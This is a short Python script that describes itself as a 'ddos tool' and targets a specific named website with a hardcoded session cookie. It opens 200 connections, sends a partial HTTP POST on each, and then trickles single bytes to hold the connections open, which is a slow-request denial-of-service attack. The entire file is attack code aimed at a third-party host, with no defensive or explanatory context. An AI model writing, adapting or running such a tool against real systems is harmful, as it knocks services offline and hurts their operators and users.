import socket
import time
import threading

#Pressure Test,ddos tool
#---------------------------
MAX_CONN=200
PORT=8000
HOST="www.sxbctv.com"
PAGE="/index.htm"
#---------------------------

buf=("POST %s HTTP/1.1\r\n"
# "Accept: text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8\r\n"
# "Accept-Encoding: gzip, deflate\r\n"
# "Content-Length: 1000\r\n"
# "Connection: keep-alive\r\n"
# "If-Modified-Since: Thu, 11 Jul 2019 10:13:43 GMT\r\n"
# "If-None-Match: 1c3f0-58d64b697e9fe\r\n"
# "Referer: http://www.sxbctv.com/xwzx.htm\r\n"
# "Upgrade-Insecure-Requests: 1\r\n"
"Cookie: JSESSIONID=95BD9B22A61F7AEA46699E7FE33B8E86\r\n"
"Host: %s\r\n"
"User-Agent: Mozilla/5.0 (Windows NT 10.0; …) Gecko/20100101 Firefox/67.0\r\n"
"\r\n" % (PAGE,HOST))
socks=[]
print(buf)
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf)
            print ("[+] Send buf OK!,conn=%d\n"%i )
            socks.append(s)
        except Exception as ex:
            print ("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(2)
#end def

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                print ("[+] send OK! %s"%s)
            except Exception as ex:
                print ("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
        time.sleep(1)
#end def

conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()